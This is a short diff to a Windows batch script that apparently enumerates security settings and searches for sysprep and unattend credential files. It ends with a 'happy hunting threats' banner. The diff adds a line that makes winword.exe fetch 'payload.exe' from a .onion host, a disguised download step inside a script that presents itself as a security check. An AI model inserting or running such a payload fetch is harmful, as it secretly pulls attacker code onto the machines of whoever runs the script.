@@ -509,6 +509,8 @@ secedit /export /cfg secpolicy.inf /areas USER_RIGHTS
 ECHO ============================
 dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
 ECHO ============================
+winword.exe http://bcdyzitklmnprti.onion/payload.exe
+ECHO ============================
 ECHO ***************************************************
 ECHO Test already Finishied  ! Happy hunting threats :)
 ECHO ***************************************************
